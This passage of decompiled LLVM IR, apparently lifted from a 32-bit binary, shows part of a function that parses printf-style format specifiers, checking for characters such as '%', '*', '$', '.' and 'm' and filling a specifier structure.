  %v2_bee0 = load i8, i8* %v1_bee0, align 1
  %v3_bee0 = zext i8 %v2_bee0 to i32
  store i32 %v3_bee0, i32* %r3.global-to-local, align 4
  %v2_bee4 = icmp eq i8 %v2_bee0, 0
  %v2_bee8 = mul i32 %v0_bee8, 2
  store i32 %v2_bee8, i32* %r0.global-to-local, align 4
  br i1 %v2_bee4, label %dec_label_pc_bef0, label %dec_label_pc_bec8

dec_label_pc_bef0:                                ; preds = %dec_label_pc_bee0
  %v1_bef0 = add i32 %storemerge105, -1
  %v2_bef0 = inttoptr i32 %v1_bef0 to i8*
  %v3_bef0 = load i8, i8* %v2_bef0, align 1
  %v7_bef4 = icmp eq i8 %v3_bef0, 37
  %v0_bef8 = load i32, i32* @r4, align 4
  %v1_bef8 = and i32 %v0_bef8, 10
  store i32 %v1_bef8, i32* %r3.global-to-local, align 4
  %v4_befc = udiv i32 %v1_bef8, 2
  %v5_befc = sub nuw nsw i32 -1, %v4_befc
  %v6_befc = and i32 %v0_bef8, %v5_befc
  store i32 %v6_befc, i32* @r4, align 4
  br i1 %v7_bef4, label %dec_label_pc_bf04, label %dec_label_pc_bde0

dec_label_pc_bf04:                                ; preds = %dec_label_pc_bef0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bf08

dec_label_pc_bf08:                                ; preds = %bb133, %dec_label_pc_be40, %dec_label_pc_be98, %dec_label_pc_bf04
  %v1_bf4c = phi i32 [ %storemerge105, %dec_label_pc_bf04 ], [ %v0_bea4, %bb133 ], [ %v0_bea4, %dec_label_pc_be98 ], [ %v0_bea4, %dec_label_pc_be40 ]
  %v0_bf48 = phi i32 [ %v5_bec8, %dec_label_pc_bf04 ], [ %v0_be40, %bb133 ], [ %v0_be40, %dec_label_pc_be98 ], [ %v0_be40, %dec_label_pc_be40 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_bf04 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_be98 ], [ %stack_var_-48.1, %dec_label_pc_be40 ]
  %v1_bf08 = inttoptr i32 %v0_bf48 to i8*
  %v2_bf08 = load i8, i8* %v1_bf08, align 1
  %v3_bf08 = zext i8 %v2_bf08 to i32
  store i32 %v3_bf08, i32* %r3.global-to-local, align 4
  %v7_bf0c = icmp eq i8 %v2_bf08, 42
  br i1 %v7_bf0c, label %dec_label_pc_bf14, label %dec_label_pc_bf58

dec_label_pc_bf14:                                ; preds = %dec_label_pc_bf08
  %v0_bf14 = load i32, i32* %sb.global-to-local, align 4
  %v2_bf14 = icmp eq i32 %v0_bf14, 0
  br i1 %v2_bf14, label %dec_label_pc_bf48, label %dec_label_pc_bf1c

dec_label_pc_bf1c:                                ; preds = %dec_label_pc_bf14
  %v1_bf1c = inttoptr i32 %v1_bf4c to i8*
  %v2_bf1c = load i8, i8* %v1_bf1c, align 1
  %v3_bf1c = zext i8 %v2_bf1c to i32
  store i32 %v3_bf1c, i32* %r3.global-to-local, align 4
  %v7_bf20 = icmp eq i8 %v2_bf1c, 36
  br i1 %v7_bf20, label %dec_label_pc_bf28, label %dec_label_pc_c1d0

dec_label_pc_bf28:                                ; preds = %dec_label_pc_bf1c
  %v0_bf28 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_bf28, 1
  br i1 %tmp134, label %dec_label_pc_c1d0, label %dec_label_pc_bf30

dec_label_pc_bf30:                                ; preds = %dec_label_pc_bf28
  store i32 %v25_bd3c, i32* %r1.global-to-local, align 4
  %v0_bf38 = load i32, i32* @lr, align 4
  %v3_bf38 = mul i32 %v0_bf38, -4
  %v4_bf38 = add i32 %v3_bf38, %v25_bd3c
  store i32 %v4_bf38, i32* %r3.global-to-local, align 4
  %v1_bf3c = add i32 %v1_bf4c, 1
  store i32 %v1_bf3c, i32* %r6.global-to-local, align 4
  %v2_bf40 = add i32 %v4_bf38, -24
  %v3_bf40 = inttoptr i32 %v2_bf40 to i32*
  store i32 %v0_bf28, i32* %v3_bf40, align 4
  br label %dec_label_pc_bf54

dec_label_pc_bf48:                                ; preds = %dec_label_pc_bf14
  %v1_bf48 = add i32 %v0_bf48, 1
  store i32 %v1_bf48, i32* %r3.global-to-local, align 4
  %v9_bf4c = icmp eq i32 %v1_bf48, %v1_bf4c
  br i1 %v9_bf4c, label %dec_label_pc_bf54, label %dec_label_pc_c1d0

dec_label_pc_bf54:                                ; preds = %dec_label_pc_bf48, %dec_label_pc_bf30
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bf58

dec_label_pc_bf58:                                ; preds = %dec_label_pc_bf08, %dec_label_pc_bf54
  %v0_bf58 = load i32, i32* @lr, align 4
  %v2_bf58 = icmp eq i32 %v0_bf58, 0
  br i1 %v2_bf58, label %dec_label_pc_bf60, label %dec_label_pc_bd78

dec_label_pc_bf60:                                ; preds = %dec_label_pc_bf58
  %v0_bf60 = load i32, i32* %r6.global-to-local, align 4
  %v1_bf60 = inttoptr i32 %v0_bf60 to i8*
  %v2_bf60 = load i8, i8* %v1_bf60, align 1
  %v3_bf60 = zext i8 %v2_bf60 to i32
  store i32 %v3_bf60, i32* %r3.global-to-local, align 4
  %v7_bf64 = icmp eq i8 %v2_bf60, 46
  br i1 %v7_bf64, label %.thread22, label %dec_label_pc_bf78

.thread22:                                        ; preds = %dec_label_pc_bf60
  %v2_bf68 = add i32 %v0_bf60, 1
  store i32 %v2_bf68, i32* %r6.global-to-local, align 4
  %v1_bf6c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_bf6c, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_bde0

dec_label_pc_bf78:                                ; preds = %dec_label_pc_bf60
  %v0_bf78 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_bf78, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_bf80

dec_label_pc_bf80:                                ; preds = %dec_label_pc_bd78, %dec_label_pc_bf78
  %v0_bf88.pre = phi i32 [ %v0_bf60, %dec_label_pc_bf78 ], [ %v0_bf88.pre.pre, %dec_label_pc_bd78 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_bf78 ], [ %v0_bd78, %dec_label_pc_bd78 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_13738.466 to i32), i32* %r1.global-to-local, align 4
  %v1_bf88 = inttoptr i32 %v0_bf88.pre to i8*
  br label %dec_label_pc_bf84

dec_label_pc_bf84:                                ; preds = %dec_label_pc_bf94, %dec_label_pc_bf80
  %v0_bf94 = phi i32 [ %v1_bf94, %dec_label_pc_bf94 ], [ ptrtoint ([9 x i8]* @global_var_13738.466 to i32), %dec_label_pc_bf80 ]
  %v1_bf84 = inttoptr i32 %v0_bf94 to i8*
  %v2_bf84 = load i8, i8* %v1_bf84, align 1
  %v3_bf84 = zext i8 %v2_bf84 to i32
  store i32 %v3_bf84, i32* %r2.global-to-local, align 4
  %v2_bf88 = load i8, i8* %v1_bf88, align 1
  %v3_bf88 = zext i8 %v2_bf88 to i32
  store i32 %v3_bf88, i32* %r3.global-to-local, align 4
  %v9_bf8c = icmp eq i8 %v2_bf88, %v2_bf84
  br i1 %v9_bf8c, label %dec_label_pc_bd80, label %dec_label_pc_bf94

dec_label_pc_bf94:                                ; preds = %dec_label_pc_bf84
  %v1_bf94 = add i32 %v0_bf94, 1
  %v2_bf94 = inttoptr i32 %v1_bf94 to i8*
  %v3_bf94 = load i8, i8* %v2_bf94, align 1
  %v4_bf94 = zext i8 %v3_bf94 to i32
  store i32 %v4_bf94, i32* %r3.global-to-local, align 4
  store i32 %v1_bf94, i32* %r1.global-to-local, align 4
  %v2_bf98 = icmp eq i8 %v3_bf94, 0
  br i1 %v2_bf98, label %dec_label_pc_bfa0, label %dec_label_pc_bf84

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_bf94, %dec_label_pc_bd80
  %v1_bfc0 = phi i32 [ %v1_bd80, %dec_label_pc_bd80 ], [ %v0_bf88.pre, %dec_label_pc_bf94 ]
  %v1_bfbc = phi i32 [ %v0_bf94, %dec_label_pc_bd80 ], [ %v1_bf94, %dec_label_pc_bf94 ]
  %v2_bfa4 = sub i32 %v1_bfbc, ptrtoint ([9 x i8]* @global_var_13738.466 to i32)
  store i32 %v2_bfa4, i32* %r3.global-to-local, align 4
  %v8_bfac = icmp sgt i32 %v2_bfa4, 1
  br i1 %v8_bfac, label %.thread25, label %dec_label_pc_bfb0

dec_label_pc_bfb0:                                ; preds = %dec_label_pc_bfa0
  %v1_bfb0 = inttoptr i32 %v1_bfc0 to i8*
  %v2_bfb0 = load i8, i8* %v1_bfb0, align 1
  %v3_bfb0 = zext i8 %v2_bfb0 to i32
  store i32 %v3_bfb0, i32* %r2.global-to-local, align 4
  %v1_bfb4 = inttoptr i32 %v1_bfbc to i8*
  %v2_bfb4 = load i8, i8* %v1_bfb4, align 1
  %v3_bfb4 = zext i8 %v2_bfb4 to i32
  store i32 %v3_bfb4, i32* %r3.global-to-local, align 4
  %v9_bfb8 = icmp eq i8 %v2_bfb0, %v2_bfb4
  br i1 %v9_bfb8, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_bfb0
  %v2_bfbc = add i32 %v1_bfbc, 9
  store i32 %v2_bfbc, i32* %r1.global-to-local, align 4
  %v2_bfc0 = add i32 %v1_bfc0, 1
  store i32 %v2_bfc0, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_bfb0, %dec_label_pc_bfa0, %bb135
  %v0_bfc8 = phi i32 [ %v1_bfbc, %dec_label_pc_bfb0 ], [ %v1_bfbc, %dec_label_pc_bfa0 ], [ %v2_bfbc, %bb135 ]
  %v0_bfc4 = phi i32 [ %v1_bfc0, %dec_label_pc_bfb0 ], [ %v1_bfc0, %dec_label_pc_bfa0 ], [ %v2_bfc0, %bb135 ]
  %v1_bfc4 = inttoptr i32 %v0_bfc4 to i8*
  %v2_bfc4 = load i8, i8* %v1_bfc4, align 1
  %v3_bfc4 = zext i8 %v2_bfc4 to i32
  store i32 %v3_bfc4, i32* %r2.global-to-local, align 4
  %v1_bfc8 = add i32 %v0_bfc8, 9
  %v2_bfc8 = inttoptr i32 %v1_bfc8 to i8*
  %v3_bfc8 = load i8, i8* %v2_bfc8, align 1
  %v4_bfc8 = zext i8 %v3_bfc8 to i32
  store i32 %v4_bfc8, i32* %r3.global-to-local, align 4
  %v2_bfcc = icmp eq i8 %v2_bfc4, 0
  %v3_bfd0 = mul nuw nsw i32 %v4_bfc8, 256
  store i32 %v3_bfd0, i32* @lr, align 4
  br i1 %v2_bfcc, label %dec_label_pc_c1d0, label %dec_label_pc_bfd8

dec_label_pc_bfd8:                                ; preds = %.thread25
  %v3_bfdc = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_bfdc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bfe0

dec_label_pc_bfe0:                                ; preds = %dec_label_pc_c064, %dec_label_pc_bfd8
  %v1_bff0 = phi i32 [ %v1_c064, %dec_label_pc_c064 ], [ ptrtoint ([21 x i8]* @global_var_13778.468 to i32), %dec_label_pc_bfd8 ]
  %v1_bfe0 = inttoptr i32 %v1_bff0 to i8*
  %v2_bfe0 = load i8, i8* %v1_bfe0, align 1
  %v3_bfe0 = zext i8 %v2_bfe0 to i32
  store i32 %v3_bfe0, i32* %r3.global-to-local, align 4
  %v9_bfe4 = icmp eq i8 %v2_bfe0, %v2_bfc4
  br i1 %v9_bfe4, label %dec_label_pc_bfec, label %dec_label_pc_c064

dec_label_pc_bfec:                                ; preds = %dec_label_pc_bfe0
  store i32 ptrtoint ([21 x i8]* @global_var_13778.468 to i32), i32* %r3.global-to-local, align 4
  %v2_bff0 = sub i32 %v1_bff0, ptrtoint ([21 x i8]* @global_var_13778.468 to i32)
  store i32 %v2_bff0, i32* %r2.global-to-local, align 4
  %v7_bff8 = icmp slt i32 %v2_bff0, 18
  br i1 %v7_bff8, label %bb137, label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_bfec
  %v1_bffc = and i32 %v3_bfd0, 1024
  %v2_bffc = icmp eq i32 %v1_bffc, 0
  br i1 %v2_bffc, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_bffc
  %v2_c000 = add i32 %v2_bff0, -2
  store i32 %v2_c000, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_bfec, %dec_label_pc_bffc, %bb136
  %v0_c004 = phi i32 [ %v2_bff0, %dec_label_pc_bfec ], [ %v2_bff0, %dec_label_pc_bffc ], [ %v2_c000, %bb136 ]
  %v1_c004 = load i32, i32* %r7.global-to-local, align 4
  %v2_c004 = add i32 %v1_c004, 32
  %v3_c004 = inttoptr i32 %v2_c004 to i32*
  store i32 %v0_c004, i32* %v3_c004, align 4
  store i32 ptrtoint (i32* @global_var_1376b.470 to i32), i32* %r1.global-to-local, align 4
  %v0_c010.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c00c

dec_label_pc_c00c:                                ; preds = %dec_label_pc_c00c, %bb137
  %v0_c00c = phi i32 [ %v1_c00c, %dec_label_pc_c00c ], [ ptrtoint (i32* @global_var_1376b.470 to i32), %bb137 ]
  %v1_c00c = add i32 %v0_c00c, 1
  %v2_c00c = inttoptr i32 %v1_c00c to i8*
  %v3_c00c = load i8, i8* %v2_c00c, align 1
  %v4_c00c = zext i8 %v3_c00c to i32
  store i32 %v4_c00c, i32* %r3.global-to-local, align 4
  store i32 %v1_c00c, i32* %r1.global-to-local, align 4
  %v8_c014 = icmp sgt i32 %v0_c010.pre, %v4_c00c
  br i1 %v8_c014, label %dec_label_pc_c00c, label %dec_label_pc_c018

dec_label_pc_c018:                                ; preds = %dec_label_pc_c00c
  store i32 ptrtoint (i32* @global_var_1375c.474 to i32), i32* %r0.global-to-local, align 4
  %v2_c020 = sub i32 %v1_c00c, ptrtoint (i32* @global_var_1376c.472 to i32)
  %v2_c024 = mul i32 %v2_c020, 2
  store i32 %v2_c024, i32* %r3.global-to-local, align 4
  %v2_c02c = add i32 %v2_c024, ptrtoint (i32* @global_var_1375c.474 to i32)
  store i32 %v2_c02c, i32* %r2.global-to-local, align 4
  %v1_c030 = add i32 %v2_c024, add (i32 ptrtoint (i32* @global_var_1375c.474 to i32), i32 1)
  %v2_c030 = inttoptr i32 %v1_c030 to i8*
  %v3_c030 = load i8, i8* %v2_c030, align 1
  %v4_c030 = zext i8 %v3_c030 to i32
  store i32 %v4_c030, i32* %r1.global-to-local, align 4
  %v2_c034 = add i32 %v2_c024, ptrtoint (i32* @global_var_1374c.476 to i32)
  store i32 %v2_c034, i32* %r2.global-to-local, align 4
  %v3_c038 = inttoptr i32 %v2_c02c to i8*
  %v4_c038 = load i8, i8* %v3_c038, align 2
  %v6_c038 = zext i8 %v4_c038 to i32
  store i32 %v6_c038, i32* %r0.global-to-local, align 4
  %v1_c03c = add i32 %v2_c024, add (i32 ptrtoint (i32* @global_var_1374c.476 to i32), i32 1)
  %v2_c03c = inttoptr i32 %v1_c03c to i8*
  %v3_c03c = load i8, i8* %v2_c03c, align 1
  %v4_c03c = zext i8 %v3_c03c to i32
  store i32 %v4_c03c, i32* %r2.global-to-local, align 4
  %v3_c040 = inttoptr i32 %v2_c034 to i8*
  %v4_c040 = load i8, i8* %v3_c040, align 2
  %v6_c040 = zext i8 %v4_c040 to i32
  %v3_c044 = mul nuw i32 %v4_c030, 16777216
  store i32 %v3_c044, i32* %r1.global-to-local, align 4
  %v4_c048 = sdiv i32 %v3_c044, 65536
  %v5_c048 = or i32 %v6_c038, %v4_c048
  %v3_c04c = mul nuw i32 %v4_c03c, 16777216
  store i32 %v3_c04c, i32* %r2.global-to-local, align 4
  %v4_c050 = sdiv i32 %v3_c04c, 65536
  %v5_c050 = or i32 %v6_c040, %v4_c050
  store i32 %v5_c050, i32* %r3.global-to-local, align 4
  %v0_c054 = load i32, i32* @lr, align 4
  %v2_c054 = or i32 %v5_c048, %v0_c054
  store i32 ptrtoint ([21 x i8]* @global_var_13778.468 to i32), i32* @ip, align 4
  %v2_c05c = and i32 %v2_c054, %v5_c050
  store i32 %v2_c05c, i32* %r0.global-to-local, align 4
  %v0_c078.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c070

dec_label_pc_c064:                                ; preds = %dec_label_pc_bfe0
  %v1_c064 = add i32 %v1_bff0, 1
  %v2_c064 = inttoptr i32 %v1_c064 to i8*
  %v3_c064 = load i8, i8* %v2_c064, align 1
  %v4_c064 = zext i8 %v3_c064 to i32
  store i32 %v4_c064, i32* %r3.global-to-local, align 4
  store i32 %v1_c064, i32* @ip, align 4
  %v2_c068 = icmp eq i8 %v3_c064, 0
  br i1 %v2_c068, label %dec_label_pc_c070, label %dec_label_pc_bfe0

dec_label_pc_c070:                                ; preds = %dec_label_pc_c064, %dec_label_pc_c018
  %v0_c07c = phi i32 [ %v0_c054, %dec_label_pc_c018 ], [ %v3_bfd0, %dec_label_pc_c064 ]
  %v0_c078 = phi i32 [ %v0_c078.pre, %dec_label_pc_c018 ], [ %v0_bfc4, %dec_label_pc_c064 ]
  %v0_c070 = phi i32 [ %v2_c05c, %dec_label_pc_c018 ], [ %v3_bfdc, %dec_label_pc_c064 ]
  store i32 %v0_c070, i32* %stack_var_-36, align 4
  %v0_c074 = load i32, i32* @r4, align 4
  %v1_c074 = and i32 %v0_c074, 4
  %v1_c078 = inttoptr i32 %v0_c078 to i8*
  %v2_c078 = load i8, i8* %v1_c078, align 1
  %v3_c078 = zext i8 %v2_c078 to i32
  store i32 %v3_c078, i32* %r1.global-to-local, align 4
  %v1_c07c = and i32 %v0_c07c, 3840
  %v1_c080 = and i32 %v0_c074, -5
  %v2_c084 = or i32 %v1_c080, %v1_c07c
  store i32 %v2_c084, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_c074, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_c094 = load i32, i32* %r7.global-to-local, align 4
  %v2_c094 = add i32 %v1_c094, 12
  %v3_c094 = inttoptr i32 %v2_c094 to i32*
  store i32 %v3_c078, i32* %v3_c094, align 4
  %v0_c098 = load i32, i32* %r7.global-to-local, align 4
  %v1_c098 = add i32 %v0_c098, 4
  %v2_c098 = inttoptr i32 %v1_c098 to i32*
  %v3_c098 = load i32, i32* @r5, align 4
  store i32 %v3_c098, i32* %v2_c098, align 4
  %v4_c098 = add i32 %v0_c098, 8
  %v5_c098 = inttoptr i32 %v4_c098 to i32*
  %v6_c098 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_c098, i32* %v5_c098, align 4
  %v0_c09c = load i32, i32* %r3.global-to-local, align 4
  %v1_c09c = load i32, i32* %r7.global-to-local, align 4
  %v2_c09c = add i32 %v1_c09c, 20
  %v3_c09c = inttoptr i32 %v2_c09c to i32*
  store i32 %v0_c09c, i32* %v3_c09c, align 4
  %v0_c0a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0a0 = load i32, i32* %r7.global-to-local, align 4
  %v2_c0a0 = add i32 %v1_c0a0, 16
  %v3_c0a0 = inttoptr i32 %v2_c0a0 to i32*
  store i32 %v0_c0a0, i32* %v3_c0a0, align 4
  %v0_c0a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_c0a4 = load i32, i32* %r7.global-to-local, align 4
  %v2_c0a4 = add i32 %v1_c0a4, 28
  %v3_c0a4 = inttoptr i32 %v2_c0a4 to i32*
  store i32 %v0_c0a4, i32* %v3_c0a4, align 4
  %v0_c0a8 = load i32, i32* @ip, align 4
  %v1_c0a8 = inttoptr i32 %v0_c0a8 to i8*
  %v2_c0a8 = load i8, i8* %v1_c0a8, align 1
  %v3_c0a8 = zext i8 %v2_c0a8 to i32
  store i32 %v3_c0a8, i32* %r2.global-to-local, align 4
  %v2_c0ac = icmp eq i8 %v2_c0a8, 0
  br i1 %v2_c0ac, label %dec_label_pc_c0b4, label %dec_label_pc_c0cc

dec_label_pc_c0b4:                                ; preds = %dec_label_pc_c070
  %v0_c0b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_c0b4 = inttoptr i32 %v0_c0b4 to i8*
  %v2_c0b4 = load i8, i8* %v1_c0b4, align 1
  %v3_c0b4 = zext i8 %v2_c0b4 to i32
  store i32 %v3_c0b4, i32* %r3.global-to-local, align 4
  %v7_c0b8 = icmp eq i8 %v2_c0b4, 109
  br i1 %v7_c0b8, label %dec_label_pc_c0c0, label %dec_label_pc_c1d0

dec_label_pc_c0c0:                                ; preds = %dec_label_pc_c0b4
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_c0c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_c0c4 = add i32 %v1_c0c4, 32
  %v3_c0c4 = inttoptr i32 %v2_c0c4 to i32*
  store i32 20, i32* %v3_c0c4, align 4
  %v0_c0c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0c8 = load i32, i32* %r7.global-to-local, align 4
  %v2_c0c8 = add i32 %v1_c0c8, 28
  %v3_c0c8 = inttoptr i32 %v2_c0c8 to i32*
  store i32 %v0_c0c8, i32* %v3_c0c8, align 4
  br label %dec_label_pc_c0cc

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c070, %dec_label_pc_c0c0
  %v0_c0cc = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_c0cc, 1
  br i1 %tmp141, label %dec_label_pc_c184, label %dec_label_pc_c0d4

dec_label_pc_c0d4:                                ; preds = %dec_label_pc_c0cc
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_c0d8

dec_label_pc_c0d8:                                ; preds = %dec_label_pc_c16c, %dec_label_pc_c0d4
  %v8_c0f4 = phi i32 [ 0, %dec_label_pc_c0d4 ], [ %v1_c170, %dec_label_pc_c16c ]
  %v7_c0dc = icmp sgt i32 %v8_c0f4, 2
  br i1 %v7_c0dc, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_c0d8
  store i32 %v25_bd3c, i32* %r2.global-to-local, align 4
  %v12_c0e0 = mul i32 %v8_c0f4, 4
  %v13_c0e0 = add i32 %v12_c0e0, %v25_bd3c
  store i32 %v13_c0e0, i32* %r3.global-to-local, align 4
  %v9_c0e4 = add i32 %v13_c0e0, -24
  %v10_c0e4 = inttoptr i32 %v9_c0e4 to i32*
  %v11_c0e4 = load i32, i32* %v10_c0e4, align 4
  store i32 %v11_c0e4, i32* %r2.global-to-local, align 4
  %v9_c0e8 = load i32, i32* %r7.global-to-local, align 4
  %v10_c0e8 = add i32 %v9_c0e8, %v8_c0f4
  store i32 %v10_c0e8, i32* %r3.global-to-local, align 4
  %v9_c0f0 = trunc i32 %v11_c0e4 to i8
  %v11_c0f0 = add i32 %v10_c0e8, 36
  %v12_c0f0 = inttoptr i32 %v11_c0f0 to i8*
  store i8 %v9_c0f0, i8* %v12_c0f0, align 1
  %v8_c0f8 = load i32, i32* %r3.global-to-local, align 4
  %v9_c0f8 = add i32 %v8_c0f8, 36
  %v10_c0f8 = inttoptr i32 %v9_c0f8 to i8*
  %v11_c0f8 = load i8, i8* %v10_c0f8, align 1
  %v12_c0f8 = zext i8 %v11_c0f8 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_c0d8
  %v10_c0f4 = add i32 %v8_c0f4, %stack_var_-48.3
  store i32 %v10_c0f4, i32* %r3.global-to-local, align 4
  %v9_c0fc = add i32 %v10_c0f4, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_c120 = phi i32 [ %v12_c0f8, %bb142 ], [ %v9_c0fc, %bb143 ]
  store i32 %v0_c120, i32* @r2, align 4
  %v1_c100 = load i32, i32* %sb.global-to-local, align 4
  %v2_c100 = sub i32 %v0_c120, %v1_c100
  %v4_c100 = xor i32 %v1_c100, %v0_c120
  %v5_c100 = xor i32 %v2_c100, %v0_c120
  %v6_c100 = and i32 %v5_c100, %v4_c100
  %v7_c100 = icmp slt i32 %v6_c100, 0
  %v8_c100 = icmp slt i32 %v2_c100, 0
  %v9_c100 = icmp eq i32 %v0_c120, %v1_c100
  %v3_c104 = xor i1 %v8_c100, %v7_c100
  %v4_c104 = or i1 %v9_c100, %v3_c104
  br i1 %v4_c104, label %dec_label_pc_c114, label %dec_label_pc_c108

dec_label_pc_c108:                                ; preds = %bb144
  %v1_c108 = add i32 %v0_c120, -9
  %v3_c108 = sub i32 8, %v0_c120
  %v4_c108 = and i32 %v3_c108, %v0_c120
  %v5_c108 = icmp slt i32 %v4_c108, 0
  %v6_c108 = icmp slt i32 %v1_c108, 0
  %v7_c108 = icmp eq i32 %v0_c120, 9
  %v3_c10c = xor i1 %v6_c108, %v5_c108
  %v4_c10c = or i1 %v7_c108, %v3_c10c
  br i1 %v4_c10c, label %dec_label_pc_c110, label %dec_label_pc_c1d0

dec_label_pc_c110:                                ; preds = %dec_label_pc_c108
  store i32 %v0_c120, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_c114

dec_label_pc_c114:                                ; preds = %bb144, %dec_label_pc_c110
  store i32 %v25_bd3c, i32* @ip, align 4
  %v1_c118 = load i32, i32* %r8.global-to-local, align 4
  %v4_c118 = mul i32 %v1_c118, 4
  %v5_c118 = add i32 %v4_c118, %v25_bd3c
  store i32 %v5_c118, i32* %r3.global-to-local, align 4
  %v1_c11c = add i32 %v5_c118, -12
  %v2_c11c = inttoptr i32 %v1_c11c to i32*
  %v3_c11c = load i32, i32* %v2_c11c, align 4
  store i32 %v3_c11c, i32* %r5.global-to-local, align 4
  %v1_c120 = add i32 %v0_c120, -1
  store i32 %v1_c120, i32* %sl.global-to-local, align 4
  %v0_c124 = load i32, i32* %r7.global-to-local, align 4
  %v4_c124 = mul i32 %v1_c120, 4
  %v5_c124 = add i32 %v0_c124, %v4_c124
  store i32 %v5_c124, i32* %r3.global-to-local, align 4
  %v7_c128 = icmp eq i32 %v3_c11c, 8
  %v1_c12c = add i32 %v5_c124, 40
  %v2_c12c = inttoptr i32 %v1_c12c to i32*
  %v3_c12c = load i32, i32* %v2_c12c, align 4
  store i32 %v3_c12c, i32* @r0, align 4
  br i1 %v7_c128, label %dec_label_pc_c16c, label %dec_label_pc_c134

dec_label_pc_c134:                                ; preds = %dec_label_pc_c114
  %v9_c134 = icmp eq i32 %v3_c12c, %v3_c11c
  br i1 %v9_c134, label %dec_label_pc_c158, label %bb145

bb145:                                            ; preds = %dec_label_pc_c134
  %v8_c138 = icmp eq i32 %v3_c12c, 8
  br i1 %v8_c138, label %dec_label_pc_c158, label %dec_label_pc_c140

dec_label_pc_c140:                                ; preds = %bb145
  %v0_c140 = call i32 @_promoted_size()
  %v0_c148 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c148, i32* @r0, align 4
  %v0_c14c = call i32 @_promoted_size()
  store i32 %v0_c14c, i32* %r0.global-to-local, align 4
  %v8_c154 = icmp sgt i32 %v0_c140, %v0_c14c
  br i1 %v8_c154, label %dec_label_pc_c16c, label %dec_label_pc_c140.dec_label_pc_c158_crit_edge

dec_label_pc_c140.dec_label_pc_c158_crit_edge:    ; preds = %dec_label_pc_c140
  %v1_c15c.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_c164.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_c164.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_c158

dec_label_pc_c158:                                ; preds = %dec_label_pc_c140.dec_label_pc_c158_crit_edge, %dec_label_pc_c134, %bb145
  %v1_c164 = phi i32 [ %v1_c164.pre, %dec_label_pc_c140.dec_label_pc_c158_crit_edge ], [ %v1_c120, %dec_label_pc_c134 ], [ %v1_c120, %bb145 ]
  %v0_c164 = phi i32 [ %v0_c164.pre, %dec_label_pc_c140.dec_label_pc_c158_crit_edge ], [ %v0_c124, %dec_label_pc_c134 ], [ %v0_c124, %bb145 ]
  %v1_c15c = phi i32 [ %v1_c15c.pre, %dec_label_pc_c140.dec_label_pc_c158_crit_edge ], [ %v1_c118, %dec_label_pc_c134 ], [ %v1_c118, %bb145 ]
  store i32 %v25_bd3c, i32* %r1.global-to-local, align 4
  %v4_c15c = mul i32 %v1_c15c, 4
  %v5_c15c = add i32 %v4_c15c, %v25_bd3c
  store i32 %v5_c15c, i32* %r3.global-to-local, align 4
  %v1_c160 = add i32 %v5_c15c, -12
  %v2_c160 = inttoptr i32 %v1_c160 to i32*
  %v3_c160 = load i32, i32* %v2_c160, align 4
  store i32 %v3_c160, i32* @r2, align 4
  %v4_c164 = mul i32 %v1_c164, 4
  %v5_c164 = add i32 %v4_c164, %v0_c164
  store i32 %v5_c164, i32* %r3.global-to-local, align 4
  %v2_c168 = add i32 %v5_c164, 40
  %v3_c168 = inttoptr i32 %v2_c168 to i32*
  store i32 %v3_c160, i32* %v3_c168, align 4
  br label %dec_label_pc_c16c

dec_label_pc_c16c:                                ; preds = %dec_label_pc_c140, %dec_label_pc_c114, %dec_label_pc_c158
  %v0_c16c = load i32, i32* %r7.global-to-local, align 4
  %v1_c16c = add i32 %v0_c16c, 28
  %v2_c16c = inttoptr i32 %v1_c16c to i32*
  %v3_c16c = load i32, i32* %v2_c16c, align 4
  %v0_c170 = load i32, i32* %r8.global-to-local, align 4
  %v1_c170 = add i32 %v0_c170, 1
  store i32 %v1_c170, i32* %r8.global-to-local, align 4
  %v1_c174 = add i32 %v3_c16c, 2
  store i32 %v1_c174, i32* %r3.global-to-local, align 4
  %v6_c17c = icmp slt i32 %v1_c170, %v1_c174
